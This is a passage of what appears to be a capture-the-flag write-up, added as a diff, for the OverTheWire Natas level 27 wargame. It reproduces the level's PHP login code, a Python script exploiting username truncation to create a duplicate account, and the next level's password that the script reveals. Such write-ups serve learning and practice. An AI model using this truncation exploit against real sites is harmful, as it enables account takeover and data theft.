+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas27', '<censored>');
+    mysqli_select_db($link, 'natas27');
+
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    }
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+The PHP code:
+
+```php
+<?php
+
+// morla / 10111
+// database gets cleared every 5 min
+
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);
+    $password=mysqli_real_escape_string($link, $pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysqli_query($link, $query);
+    if(mysqli_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    if($usr != trim($usr)) {
+        echo "Go away hacker";
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if(mysqli_affected_rows($link) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas27', '<censored>');
+    mysqli_select_db($link, 'natas27');
+
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    }
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<?php } ?>
+```
+
+In particular, there is a SQL database with table `users` defined as:
+
+```sql
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+```
+
+A function checks the credentials:
+
+```php
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);
+    $password=mysqli_real_escape_string($link, $pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysqli_query($link, $query);
+    if(mysqli_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+```
+
+Another function validates the user:
+
+```php
+function validUser($link,$usr){
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+```
+
+There is an interesting function that returns all the columns for a given user:
+
+```php
+function dumpData($link,$usr){
+
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+```
+
+Finally, a function to create a user:
+
+```php
+function createUser($link, $usr, $pass){
+
+    if($usr != trim($usr)) {
+        echo "Go away hacker";
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if(mysqli_affected_rows($link) > 0){
+        return True;
+    }
+    return False;
+}
+```
+
+The main function defines the flow:
+
+```php
+
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas27', '<censored>');
+    mysqli_select_db($link, 'natas27');
+
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    }
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<?php } ?>
+```
+
+Inserting again the credentials for the user `asd` (`asd:dsa`) as above:
+
+> Welcome asd!
+> Here is your data:
+> Array ( [username] => asd [password] => dsa )
+
+Inserting a wrong password:
+
+> Wrong password for user: asd
+
+If we try with the user `natas28` and the password `asd` we get:
+
+> Wrong password for user: natas28
+
+Craft and use the following script:
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+basic_auth = ('natas27', 'u3RRffXjysjgwFU6b9xa23i6prmUsYne')
+
+url = "http://natas27.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+
+def send_request(session, username, password) -> str:
+    body = {"username": username, "password": password}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    return response.text
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    natas28 = "natas28"
+    padding = " " * (64 - len(natas28))
+    username = natas28 + padding
+    password = ""
+    print(send_request(session, username + "x", password))
+    print(send_request(session, username, password))
+```
+
+This gives in the output:
+
+> Welcome natas28 !<br>Here is your data:<br>Array
+> (
+> [username] =&gt; natas28
+> [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+> )
+
+## Natas 27
+
+### Credentials
+
+Username: natas28
+Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+URL: http://natas28.natas.labs.overthewire.org
 
 ### Message
 
